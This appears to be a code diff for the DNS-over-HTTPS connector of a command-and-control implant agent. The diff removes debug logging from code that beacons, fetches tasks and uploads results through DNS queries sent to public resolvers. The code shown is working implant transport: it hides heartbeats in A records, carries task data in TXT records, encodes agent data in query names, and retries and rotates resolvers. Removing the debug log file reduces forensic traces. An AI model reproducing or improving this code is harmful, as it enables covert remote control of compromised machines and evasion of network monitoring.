@@ -45,66 +45,14 @@ static void MetaV1Init(DNS_META_V1* h)
 // ConnectorDoH Implementation
 // -----------------------------------------------------------------------------
 
-static void DohConnectorLog(const char* msg)
-{
-	if (!msg) return;
-
-	// Relative timestamp since first log (approx. since agent start)
-	static DWORD s_startTick = 0;
-	DWORD now = GetTickCount();
-	if (s_startTick == 0)
-		s_startTick = now;
-	DWORD delta = now - s_startTick;
-
-	CHAR line[1024] = { 0 };
-	_snprintf(line, sizeof(line), "[%08lu ms] %s", (unsigned long)delta, msg);
-
-	CHAR path[MAX_PATH] = {0};
-	DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
-	if (len == 0 || len >= MAX_PATH)
-		return;
-
-	for (int i = (int)len - 1; i >= 0; --i) {
-		if (path[i] == '\\' || path[i] == '/') {
-			path[i + 1] = '\0';
-			break;
-		}
-	}
-	const CHAR logName[] = "ax_doh_beacon.log";
-	SIZE_T dirLen = lstrlenA(path);
-	if (dirLen + sizeof(logName) >= MAX_PATH)
-		return;
-	lstrcatA(path, logName);
-
-	HANDLE hFile = CreateFileA(path,
-		FILE_APPEND_DATA,
-		FILE_SHARE_READ,
-		NULL,
-		OPEN_ALWAYS,
-		FILE_ATTRIBUTE_NORMAL,
-		NULL);
-	if (hFile == INVALID_HANDLE_VALUE)
-		return;
-
-	DWORD written = 0;
-	SIZE_T mlen = lstrlenA(line);
-	if (mlen)
-		WriteFile(hFile, line, (DWORD)mlen, &written, NULL);
-	CHAR crlf[] = "\r\n";
-	WriteFile(hFile, crlf, 2, &written, NULL);
-	CloseHandle(hFile);
-}
 
 ConnectorDoH::ConnectorDoH()
 {
-	DohConnectorLog("[DoH] Ctor: start");
 
     this->functions = (DOH_HTTP_FUNC*) ApiWin->LocalAlloc(LPTR, sizeof(DOH_HTTP_FUNC) );
     if (!this->functions) {
-        DohConnectorLog("[DoH] Ctor: LocalAlloc for DOH_HTTP_FUNC failed");
         return;
     }
-    DohConnectorLog("[DoH] Ctor: LocalAlloc OK");
     
     this->functions->LocalAlloc   = ApiWin->LocalAlloc;
     this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
@@ -114,10 +62,8 @@ ConnectorDoH::ConnectorDoH()
 
     HMODULE hWininetModule = this->functions->LoadLibraryA("wininet.dll" );
     if (!hWininetModule) {
-        DohConnectorLog("[DoH] Ctor: LoadLibraryA(wininet.dll) failed");
         return;
     }
-    DohConnectorLog("[DoH] Ctor: wininet.dll loaded");
 
     	if ( hWininetModule )
 	{
@@ -134,24 +80,7 @@ ConnectorDoH::ConnectorDoH()
 
 		if ( !this->functions->InternetOpenA || !this->functions->InternetConnectA || !this->functions->HttpOpenRequestA || !this->functions->HttpSendRequestA || !this->functions->InternetReadFile )
 		{
-			DohConnectorLog("[DoH] Ctor: WinINet symbols missing");
 		}
-		else {
-			DohConnectorLog("[DoH] Ctor: WinINet symbols resolved");
-			CHAR dbg[256];
-			_snprintf(dbg, sizeof(dbg),
-				"[DoH] Ctor: this=%p funcs=%p LA=%p IO=%p IC=%p HO=%p HS=%p IRF=%p",
-				this,
-				this->functions,
-				this->functions->LocalAlloc,
-				this->functions->InternetOpenA,
-				this->functions->InternetConnectA,
-				this->functions->HttpOpenRequestA,
-				this->functions->HttpSendRequestA,
-				this->functions->InternetReadFile);
-			DohConnectorLog(dbg);
-		}
-
     }
 }
 
@@ -163,7 +92,6 @@ BOOL ConnectorDoH::SetConfig(ProfileDoH profile, BYTE* beat, ULONG beatSize)
 {
     // Verify WinINet APIs are loaded
     if (!this->functions || !this->functions->InternetOpenA || !this->functions->HttpSendRequestA) {
-        DohConnectorLog("[DoH] SetConfig: WinINet functions missing");
         return FALSE;
     }
 
@@ -215,7 +143,6 @@ BOOL ConnectorDoH::SetConfig(ProfileDoH profile, BYTE* beat, ULONG beatSize)
     
     // Fallback: If no URLs provided, use Google DNS as default
     if (this->urlCount == 0) {
-        DohConnectorLog("[DoH] SetConfig: urlCount=0, fallback to https://dns.google/dns-query");
         CHAR defaultUrl[] = "https://dns.google/dns-query";
         lstrcpynA(this->rawUrls, defaultUrl, sizeof(this->rawUrls));
         this->urlList[0] = this->rawUrls;
@@ -232,13 +159,11 @@ BOOL ConnectorDoH::SetConfig(ProfileDoH profile, BYTE* beat, ULONG beatSize)
     }
 
     if (!beat || !beatSize || beatSize < 8) {
-        DohConnectorLog("[DoH] SetConfig: invalid beat (null or too small)");
         return FALSE;
     }
 
     BYTE* beatCopy = (BYTE*)MemAllocLocal(beatSize);
     if (!beatCopy) {
-        DohConnectorLog("[DoH] SetConfig: MemAllocLocal for beatCopy failed");
         return FALSE;
     }
     memcpy(beatCopy, beat, beatSize);
@@ -281,9 +206,7 @@ BOOL ConnectorDoH::SetConfig(ProfileDoH profile, BYTE* beat, ULONG beatSize)
 			this->functions ? this->functions->HttpOpenRequestA : NULL,
 			this->functions ? this->functions->HttpSendRequestA : NULL,
 			this->functions ? this->functions->InternetReadFile : NULL);
-		DohConnectorLog(dbg);
 	}
-	DohConnectorLog("[DoH] SetConfig: OK (initialized)");
 	return TRUE;
 }
 
@@ -376,7 +299,6 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, USHORT qtype, BYTE** ou
     *outLen = 0;
 
 	if (!this->functions) {
-		DohConnectorLog("[DoH] HTTP: functions == NULL");
 		return FALSE;
 	}
 	if (!this->functions->LocalAlloc ||
@@ -385,7 +307,6 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, USHORT qtype, BYTE** ou
 		!this->functions->HttpOpenRequestA ||
 		!this->functions->HttpSendRequestA ||
 		!this->functions->InternetReadFile) {
-		DohConnectorLog("[DoH] HTTP: critical WinINet pointers missing");
 		CHAR dbg[256];
 		_snprintf(dbg, sizeof(dbg),
 			"[DoH] HTTP: funcs=%p LA=%p IO=%p IC=%p HO=%p HS=%p IRF=%p",
@@ -396,18 +317,14 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, USHORT qtype, BYTE** ou
 			this->functions->HttpOpenRequestA,
 			this->functions->HttpSendRequestA,
 			this->functions->InternetReadFile);
-		DohConnectorLog(dbg);
 		return FALSE;
 	}
 
-	DohConnectorLog("[DoH] HTTP: PerformHttpRequest enter");
-	if (qname) DohConnectorLog(qname);
 
     // 1. Construct DNS Wire Format Query
     const int kDnsQueryMax = 4096;
     BYTE* query = (BYTE*)this->functions->LocalAlloc(LPTR, kDnsQueryMax);
     if (!query) {
-        DohConnectorLog("[DoH] HTTP: LocalAlloc failed for DNS query buffer");
         return FALSE;
     }
 
@@ -433,7 +350,6 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, USHORT qtype, BYTE** ou
 	{
 		CHAR dbg[96];
 		_snprintf(dbg, sizeof(dbg), "[DoH] HTTP: nameLen=%d offset=%d", nameLen, offset);
-		DohConnectorLog(dbg);
 	}
 
     	// 确保还有空间写入 QTYPE/QCLASS
@@ -468,14 +384,11 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, USHORT qtype, BYTE** ou
     }
 
     if (!this->hInternet) {
-        DohConnectorLog("[DoH] HTTP: InternetOpenA start");
         this->hInternet = this->functions->InternetOpenA(
             (CHAR*)(this->profile.user_agent ? this->profile.user_agent : "Mozilla/5.0"), 
             INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
         if (!this->hInternet) {
-            DohConnectorLog("[DoH] HTTP: InternetOpenA failed");
         } else {
-            DohConnectorLog("[DoH] HTTP: InternetOpenA OK");
         }
     }
     if (!this->hInternet) {
@@ -497,8 +410,6 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, USHORT qtype, BYTE** ou
         if (this->urlDisabledUntil[idx] && nowTick < this->urlDisabledUntil[idx]) {
             continue;
         }
-        DohConnectorLog("[DoH] HTTP: using URL");
-        DohConnectorLog(targetUrl);
 
         CHAR hostName[256] = {0};
         CHAR urlPath[256] = {0};
@@ -541,7 +452,6 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, USHORT qtype, BYTE** ou
 
             this->hConnect = this->functions->InternetConnectA(this->hInternet, hostName, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
             if (!this->hConnect) {
-                DohConnectorLog("[DoH] HTTP: InternetConnectA failed, rotating URL");
                 this->connectedUrlIndex = 0xFFFFFFFF; // Mark as no valid connection
                 this->urlFailCount[idx]++;
                 if (this->urlFailCount[idx] >= 2) {
@@ -553,7 +463,6 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, USHORT qtype, BYTE** ou
                 continue;
             }
             this->connectedUrlIndex = idx; // Track which URL this connection is for
-            DohConnectorLog("[DoH] HTTP: new connection established");
         }
 
         DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_COOKIES;
@@ -561,7 +470,6 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, USHORT qtype, BYTE** ou
 
         HINTERNET hRequest = this->functions->HttpOpenRequestA(this->hConnect, "POST", urlPath, NULL, NULL, NULL, flags, 0);
         if (!hRequest) {
-            DohConnectorLog("[DoH] HTTP: HttpOpenRequestA failed, rotating URL");
             this->urlFailCount[idx]++;
             if (this->urlFailCount[idx] >= 2) {
                 ULONG backoff = 30000;
@@ -601,14 +509,12 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, USHORT qtype, BYTE** ou
 
                     do {
                         if (!this->functions->InternetQueryDataAvailable(hRequest, &dwSize, 0, 0)) {
-                            DohConnectorLog("[DoH] HTTP: InternetQueryDataAvailable failed");
                             readSuccess = FALSE; break; 
                         }
                         if (dwSize == 0) break;
                         
                         BYTE* newBuf = (BYTE*)this->functions->LocalAlloc(LPTR, respSize + dwSize);
                         if (!newBuf) {
-                            DohConnectorLog("[DoH] HTTP: LocalAlloc failed while extending respBuf");
                             readSuccess = FALSE;
                             break;
                         }
@@ -621,7 +527,6 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, USHORT qtype, BYTE** ou
                         if (this->functions->InternetReadFile(hRequest, respBuf + respSize, dwSize, &dwDownloaded)) {
                             respSize += dwDownloaded;
                         } else {
-                            DohConnectorLog("[DoH] HTTP: InternetReadFile failed");
                             readSuccess = FALSE; break;
                         }
                     } while (dwSize > 0);
@@ -629,7 +534,6 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, USHORT qtype, BYTE** ou
                     if (readSuccess && respBuf && respSize > 0) {
                         CHAR dbg[96];
                         _snprintf(dbg, sizeof(dbg), "[DoH] HTTP: respSize=%lu", (unsigned long)respSize);
-                        DohConnectorLog(dbg);
                         // Success! Update current index
                         this->currentUrlIndex = idx;
                         this->urlFailCount[idx] = 0;
@@ -643,7 +547,6 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, USHORT qtype, BYTE** ou
                     
                     if (respBuf) this->functions->LocalFree(respBuf);
                 } else {
-                    DohConnectorLog("[DoH] HTTP: statusCode != 200");
                 }
             }
         }
@@ -680,13 +583,11 @@ BOOL ConnectorDoH::DohQueryTxt(const CHAR* qname, BYTE* outBuf, ULONG outBufSize
     this->lastQueryOk = FALSE;
 
     if (!PerformHttpRequest(qname, 0x0010, &respData, &respLen)) {
-        DohConnectorLog("[DoH] DohQueryTxt: PerformHttpRequest FAILED");
         return FALSE;
     }
 
     // Safe parsing of DNS response
     if (respLen < 12) {
-        DohConnectorLog("[DoH] DohQueryTxt: respLen too small for header");
         this->functions->LocalFree(respData);
         return FALSE;
     }
@@ -705,7 +606,6 @@ BOOL ConnectorDoH::DohQueryTxt(const CHAR* qname, BYTE* outBuf, ULONG outBufSize
             if ((lab & 0xC0) == 0xC0) {
                 // compression pointer
                 if (pos + 1 >= maxLen) {
-                    DohConnectorLog("[DoH] DohQueryTxt: question name ptr truncated");
                     this->functions->LocalFree(respData);
                     return FALSE;
                 }
@@ -718,7 +618,6 @@ BOOL ConnectorDoH::DohQueryTxt(const CHAR* qname, BYTE* outBuf, ULONG outBufSize
             }
             // label length + content
             if (pos + 1 + lab > maxLen) {
-                DohConnectorLog("[DoH] DohQueryTxt: question label exceeds buffer");
                 this->functions->LocalFree(respData);
                 return FALSE;
             }
@@ -726,7 +625,6 @@ BOOL ConnectorDoH::DohQueryTxt(const CHAR* qname, BYTE* outBuf, ULONG outBufSize
         }
         // Skip QTYPE + QCLASS
         if (pos + 4 > maxLen) {
-            DohConnectorLog("[DoH] DohQueryTxt: question tail truncated");
             this->functions->LocalFree(respData);
             return FALSE;
         }
@@ -742,7 +640,6 @@ BOOL ConnectorDoH::DohQueryTxt(const CHAR* qname, BYTE* outBuf, ULONG outBufSize
             BYTE lab = resp[pos];
             if ((lab & 0xC0) == 0xC0) {
                 if (pos + 1 >= maxLen) {
-                    DohConnectorLog("[DoH] DohQueryTxt: answer name ptr truncated");
                     this->functions->LocalFree(respData);
                     return FALSE;
                 }
@@ -754,7 +651,6 @@ BOOL ConnectorDoH::DohQueryTxt(const CHAR* qname, BYTE* outBuf, ULONG outBufSize
                 break;
             }
             if (pos + 1 + lab > maxLen) {
-                DohConnectorLog("[DoH] DohQueryTxt: answer label exceeds buffer");
                 this->functions->LocalFree(respData);
                 return FALSE;
             }
@@ -767,7 +663,6 @@ BOOL ConnectorDoH::DohQueryTxt(const CHAR* qname, BYTE* outBuf, ULONG outBufSize
         USHORT rdlen = (resp[pos + 8] << 8) | resp[pos + 9];
         pos += 10;
         if (pos + rdlen > maxLen) {
-            DohConnectorLog("[DoH] DohQueryTxt: RDLEN exceeds buffer");
             break;
         }
 
@@ -817,13 +712,11 @@ BOOL ConnectorDoH::DohQueryA(const CHAR* qname, BYTE* outBuf, ULONG outBufSize, 
     this->lastQueryOk = FALSE;
 
     if (!PerformHttpRequest(qname, 0x0001, &respData, &respLen)) {
-        DohConnectorLog("[DoH] DohQueryA: PerformHttpRequest FAILED");
         return FALSE;
     }
 
     // Basic DNS header check
     if (respLen < 12) {
-        DohConnectorLog("[DoH] DohQueryA: respLen too small for header");
         this->functions->LocalFree(respData);
         return FALSE;
     }
@@ -840,7 +733,6 @@ BOOL ConnectorDoH::DohQueryA(const CHAR* qname, BYTE* outBuf, ULONG outBufSize, 
             BYTE lab = resp[pos];
             if ((lab & 0xC0) == 0xC0) {
                 if (pos + 1 >= maxLen) {
-                    DohConnectorLog("[DoH] DohQueryA: question name ptr truncated");
                     this->functions->LocalFree(respData);
                     return FALSE;
                 }
@@ -852,14 +744,12 @@ BOOL ConnectorDoH::DohQueryA(const CHAR* qname, BYTE* outBuf, ULONG outBufSize, 
                 break;
             }
             if (pos + 1 + lab > maxLen) {
-                DohConnectorLog("[DoH] DohQueryA: question label exceeds buffer");
                 this->functions->LocalFree(respData);
                 return FALSE;
             }
             pos += 1 + lab;
         }
         if (pos + 4 > maxLen) {
-            DohConnectorLog("[DoH] DohQueryA: question tail truncated");
             this->functions->LocalFree(respData);
             return FALSE;
         }
@@ -873,7 +763,6 @@ BOOL ConnectorDoH::DohQueryA(const CHAR* qname, BYTE* outBuf, ULONG outBufSize, 
             BYTE lab = resp[pos];
             if ((lab & 0xC0) == 0xC0) {
                 if (pos + 1 >= maxLen) {
-                    DohConnectorLog("[DoH] DohQueryA: answer name ptr truncated");
                     this->functions->LocalFree(respData);
                     return FALSE;
                 }
@@ -885,7 +774,6 @@ BOOL ConnectorDoH::DohQueryA(const CHAR* qname, BYTE* outBuf, ULONG outBufSize, 
                 break;
             }
             if (pos + 1 + lab > maxLen) {
-                DohConnectorLog("[DoH] DohQueryA: answer label exceeds buffer");
                 this->functions->LocalFree(respData);
                 return FALSE;
             }
@@ -898,7 +786,6 @@ BOOL ConnectorDoH::DohQueryA(const CHAR* qname, BYTE* outBuf, ULONG outBufSize, 
         USHORT rdlen = (resp[pos + 8] << 8) | resp[pos + 9];
         pos += 10;
         if (pos + rdlen > maxLen) {
-            DohConnectorLog("[DoH] DohQueryA: RDLEN exceeds buffer");
             break;
         }
 
@@ -937,7 +824,6 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 	//    a task response, not the agent beat.
 	// -------------------------------------------------------------------------
 	if (!this->hiSent && this->hiBeat && this->hiBeatSize && this->hiRetries > 0) {
-		DohConnectorLog("[DoH] SendData: HI phase start (using cached hiBeat)");
 		// DoH can handle larger frames than raw DNS since data is in HTTP body.
 		// 100 bytes raw -> ~160 chars Base32. With prefix + domain (~55 chars)
 		// this keeps QNAME safely under the 253-byte DNS limit.
@@ -948,10 +834,8 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 		{
 			CHAR dbg[128];
 			_snprintf(dbg, sizeof(dbg), "[DoH] HI: cachedBeat=%lu maxBuf=%lu", (unsigned long)this->hiBeatSize, (unsigned long)maxBuf);
-			DohConnectorLog(dbg);
 		}
 		if (maxBuf == 0) {
-			DohConnectorLog("[DoH] SendData: HI maxBuf == 0, skipping HI");
 			this->hiSent = TRUE; // avoid looping forever
 		}
 		else {
@@ -967,7 +851,6 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 				_snprintf(hexDbg, sizeof(hexDbg), "[DoH] HI DEBUG: Key=%02X%02X%02X%02X Data=%02X%02X%02X%02X", 
 					this->encryptKey[0], this->encryptKey[1], this->encryptKey[2], this->encryptKey[3],
 					encBuf[0], encBuf[1], encBuf[2], encBuf[3]);
-				DohConnectorLog(hexDbg);
 			}
 
 			memset(dataLabel, 0, sizeof(dataLabel));
@@ -982,13 +865,11 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 			ULONG tmpSize = 0;
 			if (DohQueryTxt(qname, tmp, sizeof(tmp), &tmpSize)) {
 				this->hiSent = TRUE;
-				DohConnectorLog("[DoH] HI sent successfully");
 			}
 			else if (this->hiRetries > 0) {
 				this->hiRetries--;
 				CHAR retryDbg[64];
 				_snprintf(retryDbg, sizeof(retryDbg), "[DoH] HI failed, retries left: %lu", (unsigned long)this->hiRetries);
-				DohConnectorLog(retryDbg);
 			}
 		}
 		return;
@@ -1069,14 +950,12 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 			BOOL putOk = FALSE;
 			for (int retry = 0; retry < 3 && !putOk; retry++) {
 				if (retry > 0) {
-					DnsDebugLogf("[DoH] PUT: retry %d for offset=%lu", retry, offset);
 					ApiWin->Sleep(100 + (GetTickCount() % 50));  // Backoff before retry
 				}
 				putOk = DohQueryTxt(qname, tmp, sizeof(tmp), &tmpSize);
 			}
 			
 			if (!putOk) {
-				DnsDebugLogf("[DoH] PUT: FAILED after 3 retries for offset=%lu - aborting upload", offset);
 				return;  // Abort upload, will retry entire upload next time
 			}
 
@@ -1088,7 +967,6 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 			offset += chunk;
 		}
 		this->lastUpTotal = total;
-		DnsDebugLogf("[DoH] PUT: completed, total=%lu bytes sent", total);
 		
 		// After PUT, send ACK heartbeat with taskNonce to confirm which task was completed
 		// HB data format: [ackOffset:4][hbNonce:4][ackTaskNonce:4] = 12 bytes
@@ -1119,8 +997,6 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 			BYTE tmp[16];
 			ULONG tmpSize = 0;
 			DohQueryA(ackQname, tmp, sizeof(tmp), &tmpSize);
-			DnsDebugLogf("[DoH] PUT: sent ACK ackOffset=%lu nonce=%08x taskNonce=%08lx", 
-			             this->downAckOffset, ackNonce, this->downTaskNonce);
 			// NOTE: Do NOT reset downAckOffset here! Keep it so subsequent HB requests
 			// continue to carry the ACK until server confirms (no_tasks) or new task starts.
 		}
@@ -1219,13 +1095,10 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 		ULONG hbSeqLogical = this->seq + 1;
 		ULONG hbWireSeq = DnsBuildWireSeq(hbSeqLogical, kDnsSignalBitsDoH);
 		DnsBuildQName(this->sid, "hb", hbWireSeq, this->idx, hbLabel, this->domain, qnameA, sizeof(qnameA));
-		DnsDebugLogf("[DoH] HEARTBEAT(A): seq=%lu ack=%lu nonce=%08x taskNonce=%08lx", 
-		             this->seq + 1, this->downAckOffset, hbNonce, this->downTaskNonce);
 		BYTE ipBuf[16];
 		ULONG ipSize = 0;
 		if (DohQueryA(qnameA, ipBuf, sizeof(ipBuf), &ipSize) && ipSize >= 4) {
 			if (ipBuf[0] == 0 && ipBuf[1] == 0 && ipBuf[2] == 0 && ipBuf[3] == 0) {
-				DnsDebugLog("[DoH] HEARTBEAT: no tasks (0.0.0.0)");
 				// No tasks: advance seq and return immediately.
 				this->seq++;
 				// 重置 ACK offset 因为没有待下载的任务
@@ -1237,13 +1110,10 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 			// CRITICAL: 设置 hasPendingTasks 后立即返回，不要在同一个 SendData 中执行 GET
 			// 这样 MainAgent 才能在下一轮循环检查 IsBusy() 并进入 burst 模式
 			this->hasPendingTasks = TRUE;
-			this->seq++; // 更新 seq，因为心跳已完成
-			DnsDebugLogf("[DoH] HEARTBEAT: has tasks (IP=%u.%u.%u.%u) - return to trigger burst", 
-			             ipBuf[0], ipBuf[1], ipBuf[2], ipBuf[3]);
-			return; // 返回让 MainAgent 检查 IsBusy() 并进入 burst
+			this->seq++;
+			return;
 		} else {
 			// A-record heartbeat failed; skip TXT this round and retry later.
-			DnsDebugLog("[DoH] HEARTBEAT: A query FAILED");
 			return;
 		}
 	}
@@ -1268,7 +1138,6 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 	DnsBase32Encode(reqData, 8, reqLabel, sizeof(reqLabel));
 	
 	DnsBuildQName(this->sid, "api", ++this->seq, this->idx, reqLabel, this->domain, qname, sizeof(qname));
-	DnsDebugLogf("[DoH] GET(TXT): seq=%lu reqOffset=%lu nonce=%08x", this->seq, reqOffset, nonce);
 	BYTE respBuf[4096];
 	ULONG respSize = 0;
 	if (DohQueryTxt(qname, respBuf, sizeof(respBuf), &respSize) && respSize > 0) {
@@ -1281,11 +1150,9 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 		BYTE binBuf[4096];
 		int binLen = DnsBase64Decode((const CHAR*)respBuf, (int)respSize, binBuf, (int)sizeof(binBuf));
 		if (binLen <= 0) {
-			DnsDebugLog("[DoH] GET: Base64 decode failed or empty response");
 			// Server may have restarted and lost task state
 			// Abort current download so next heartbeat can re-check for tasks
 			if (this->downBuf) {
-				DnsDebugLog("[DoH] GET: Aborting incomplete download due to empty response");
 				MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
 				this->downBuf = NULL;
 				this->downTotal = 0;
@@ -1312,7 +1179,6 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 			offset |= ((ULONG)binBuf[6] << 8);
 			offset |= ((ULONG)binBuf[7] << 0);
 			ULONG chunkLen = (ULONG)(binLen - (int)headerSize);
-			DnsDebugLogf("[DoH] GET: chunk total=%lu offset=%lu len=%lu (wanted=%lu)", total, offset, chunkLen, reqOffset);
 			const ULONG maxDownloadSize = 4u << 20; // 4MB
 			if (total > 0 && total <= maxDownloadSize && offset < total) {
 				// NEW DESIGN: Verify received offset matches what we requested.
@@ -1329,8 +1195,6 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 						
 						if (newTaskNonce != 0 && newTaskNonce != this->downTaskNonce) {
 							// Different taskNonce: Server restarted with new task, reset our state
-							DnsDebugLogf("[DoH] GET: SERVER_RESTART: new_nonce=%08lx old_nonce=%08lx - resetting", 
-							             newTaskNonce, this->downTaskNonce);
 							if (this->downBuf) {
 								MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
 							}
@@ -1342,11 +1206,9 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 							// Don't return - let it fall through to process this as new task
 						} else {
 							// Same taskNonce or unknown: probably cached old response, discard
-							DnsDebugLogf("[DoH] GET: OFFSET MISMATCH! Got %lu, wanted %lu - discarding", offset, reqOffset);
 							return;
 						}
 					} else {
-						DnsDebugLogf("[DoH] GET: OFFSET MISMATCH! Got %lu, wanted %lu - discarding", offset, reqOffset);
 						return;
 					}
 				}
@@ -1366,8 +1228,6 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 				BOOL isNewTask = (!this->downBuf || this->downTotal != total);
 				// Also check taskNonce: if nonce differs, it's a new task even if total is same
 				if (!isNewTask && offset == 0 && chunkTaskNonce != 0 && chunkTaskNonce != this->downTaskNonce) {
-					DnsDebugLogf("[DoH] GET: taskNonce_changed old=%08lx new=%08lx restart", 
-					             this->downTaskNonce, chunkTaskNonce);
 					isNewTask = TRUE;
 				}
 				
@@ -1376,8 +1236,6 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 				// this is likely a cache replaying the old task response. Ignore it.
 				if (isNewTask && offset == 0 && chunkTaskNonce != 0 && 
 				    chunkTaskNonce == this->downTaskNonce && this->downAckOffset > 0) {
-					DnsDebugLogf("[DoH] GET: REJECT cached replay of completed task nonce=%08lx ack=%lu",
-					             chunkTaskNonce, this->downAckOffset);
 					return; // Ignore this cached response
 				}
 				
@@ -1385,8 +1243,6 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 					// CRITICAL: If total or taskNonce changed, this is a NEW task
 					// We must discard current chunk and restart from offset=0
 					if (this->downBuf && this->downTotal) {
-						DnsDebugLogf("[DoH] GET: TASK CHANGED! old_total=%lu new_total=%lu - restarting download", 
-						             this->downTotal, total);
 						MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
 					}
 					this->downBuf = (BYTE*)MemAllocLocal(total);
@@ -1399,11 +1255,9 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 					this->downFilled = 0;
 					this->downAckOffset = 0; // Reset ACK offset for NEW task
 					this->downTaskNonce = chunkTaskNonce; // Record new task nonce
-					DnsDebugLogf("[DoH] GET: starting new task, total=%lu bytes nonce=%08lx", total, chunkTaskNonce);
 					
 					// If current chunk offset != 0, discard it and request from 0 next time
 					if (offset != 0) {
-						DnsDebugLogf("[DoH] GET: received offset=%lu but need offset=0 - discarding, will retry", offset);
 						return; // Next SendData() will request offset=0
 					}
 				}
@@ -1418,9 +1272,6 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 				// Update progress: since we request sequentially, downFilled = offset + n
 				this->downFilled = offset + n;
 				this->downAckOffset = this->downFilled;
-				DnsDebugLogf("[DoH] GET: reassembly progress %lu/%lu (%.1f%%)", 
-				             this->downFilled, this->downTotal, 
-				             (float)this->downFilled * 100.0f / (float)this->downTotal);
 				if (this->downFilled >= this->downTotal) {
 					// Session header: [flags:1][taskNonce:4][origLen:4], followed by payload
 					// Frame header size = 1 + 4 + 4 = 9 bytes
@@ -1481,7 +1332,6 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 					this->downTotal = 0;
 					this->downFilled = 0;
 					this->hasPendingTasks = FALSE;
-					DnsDebugLogf("[DoH] GET: task ready, size=%lu bytes, ackOffset=%lu (will ACK completion)", finalSize, this->downAckOffset);
 				}
 				return;
 			}
@@ -1525,10 +1375,5 @@ void ConnectorDoH::ReportProtocolResult(BOOL success)
 
 BOOL ConnectorDoH::IsBusy() const
 {
-	BOOL busy = (this->downBuf != NULL) || this->hasPendingTasks;
-	// Debug log when busy to help diagnose burst mode issues
-	if (busy) {
-		DohConnectorLog("[DoH] IsBusy=TRUE (downBuf or hasPendingTasks)");
-	}
-	return busy;
+	return (this->downBuf != NULL) || this->hasPendingTasks;
 }
